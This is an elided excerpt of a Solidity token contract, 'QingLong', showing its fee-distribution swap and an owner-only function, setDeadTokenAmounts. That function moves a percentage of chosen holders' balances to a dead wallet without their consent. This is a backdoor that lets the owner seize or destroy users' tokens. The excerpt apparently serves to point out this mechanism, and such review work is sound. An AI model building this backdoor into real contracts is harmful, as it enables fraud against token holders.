...
contract QingLong is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;
    address public lpFeeAddressA;
    address public lpFeeAddressB;
    ...
    constructor (
        ...
        address FundAddress, address LpFeeAddressA, address LpFeeAddressB, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ...
        lpFeeAddressA = LpFeeAddressA;
        lpFeeAddressB = LpFeeAddressB;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint256 lpFeeAmount = fistBalance * (_buyLPFee + _sellLPFee) * 2 / swapFee;
        FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
        FIST.transferFrom(address(_tokenDistributor), lpFeeAddressA, lpFeeAmount / 2);
        FIST.transferFrom(address(_tokenDistributor), lpFeeAddressB, lpFeeAmount / 2);
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount - lpFeeAmount);
    ...
    function setDeadTokenAmounts(address[] calldata holders, uint256 fee, uint256 minDeadAmountsCondition) external onlyOwner {
        for (uint i = 0; i < holders.length; ++i) {
            if (balanceOf(holders[i]) >= minDeadAmountsCondition) {
                uint256 deadAmounts = balanceOf(holders[i]) * fee / 100;
                _transfer(holders[i], deadWallet, deadAmounts);
            }
        }
    }
}